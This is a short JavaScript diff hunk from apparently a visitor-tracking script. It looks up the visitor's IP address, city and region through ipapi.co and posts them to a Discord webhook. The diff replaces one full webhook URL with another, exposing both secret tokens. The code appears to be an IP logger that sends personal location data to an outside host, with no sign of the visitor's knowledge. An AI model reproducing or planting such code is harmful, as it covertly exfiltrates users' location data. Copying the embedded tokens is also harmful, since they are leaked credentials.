@@ -13,7 +13,7 @@ fetch('https://ipapi.co/json/')
 function send(ip,city,region,version) {
 
 fetch(
-  'https://discord.com/api/webhooks/1310107888949137479/-b4M8Rvs2uqvio6LtQMVmmZuYQtIwd62_CL18WTJiI6EiyCsNXhYoCgCcSR-lQsx7PjB',
+  'https://discord.com/api/webhooks/1355867531457331303/ik89sW3-lrpcv7gLmBgBpHgSzSAeVJUWg6knR18OdGGCvLCVukjpL8h26Nt7zTUPR6Su',
   {
     method: 'post',
     headers: {
